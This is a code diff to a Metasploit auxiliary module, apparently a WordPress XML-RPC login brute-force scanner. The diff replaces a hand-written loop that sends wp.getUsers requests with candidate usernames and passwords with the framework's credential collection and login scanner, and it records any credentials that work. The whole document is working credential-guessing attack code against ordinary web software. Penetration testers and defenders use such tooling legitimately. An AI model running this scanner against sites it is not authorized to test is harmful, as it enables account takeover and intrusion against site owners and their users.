@@ -8,6 +8,10 @@
 ##
 
 require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/wordpress_rpc'
+
+
 class Metasploit3 < Msf::Auxiliary
   include Msf::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
@@ -64,18 +68,6 @@ class Metasploit3 < Msf::Auxiliary
     return false
   end
 
-  def generate_xml_request(user, pass)
-    xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
-    xml << '<methodCall>'
-    xml << '<methodName>wp.getUsers</methodName>'
-    xml << '<params><param><value>1</value></param>'
-    xml << "<param><value>#{user}</value></param>"
-    xml << "<param><value>#{pass}</value></param>"
-    xml << '</params>'
-    xml << '</methodCall>'
-    xml
-  end
-
   def run_host(ip)
     print_status("#{peer}:#{wordpress_url_xmlrpc} - Sending Hello...")
     if xmlrpc_enabled?
@@ -86,62 +78,50 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     print_status("#{peer} - Starting XML-RPC login sweep...")
-    each_user_pass do |user, pass|
-      do_login(user, pass)
-    end
-  end
 
-  def do_login(user, pass)
-    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
-    xml_req = generate_xml_request(user, pass)
-    begin
-      res = send_request_cgi(
-        {
-          'uri'       => wordpress_url_xmlrpc,
-          'method'    => 'POST',
-          'data'      => xml_req
-        }, 25)
-      http_fingerprint(response: res)
-    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      print_error("#{peer} - HTTP Connection Failed, Aborting")
-      return :abort
-    end
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+        blank_passwords: datastore['BLANK_PASSWORDS'],
+        pass_file: datastore['PASS_FILE'],
+        password: datastore['PASSWORD'],
+        user_file: datastore['USER_FILE'],
+        userpass_file: datastore['USERPASS_FILE'],
+        username: datastore['USERNAME'],
+        user_as_pass: datastore['USER_AS_PASS'],
+    )
 
-    unless res
-      print_error("#{peer} - Connection timed out, Aborting")
-      return :abort
-    end
-
-    if res.code != 200
-      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
-      return :skip_pass
-    end
-
-    # TODO: add more error codes
-    if res.body =~ /<value><int>403<\/int><\/value>/
-      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
-      return :skip_pass
-
-    elsif res.body =~ /<value><int>-32601<\/int><\/value>/
-      print_error('Server error: Requested method `wp.getUsers` does not exists. -- Aborting')
-      return :abort
-
-    elsif res.body =~ /<value><int>401<\/int><\/value>/ || res.body =~ /<name>user_id<\/name>/
-      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
-      # If verbose set True, dump xml response
-      vprint_good("#{res}")
-
-      report_hash = {
-        host: rhost,
+    scanner = Metasploit::Framework::LoginScanner::WordpressRPC.new(
+        host: ip,
         port: rport,
-        sname: 'wordpress-xmlrpc',
-        user: user,
-        pass: pass,
-        active: true,
-        type: 'password' }
+        uri: wordpress_url_xmlrpc,
+        proxies: datastore["PROXIES"],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        connection_timeout: 5,
+    )
 
-      report_auth_info(report_hash)
-      return :next_user
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
+      case result.status
+        when Metasploit::Model::Login::Status::SUCCESSFUL
+          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+          credential_core = create_credential(credential_data)
+          credential_data[:core] = credential_core
+          create_credential_login(credential_data)
+          :next_user
+        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+          invalidate_login(credential_data)
+          :abort
+        when Metasploit::Model::Login::Status::INCORRECT
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+          invalidate_login(credential_data)
+      end
     end
+
   end
+
 end
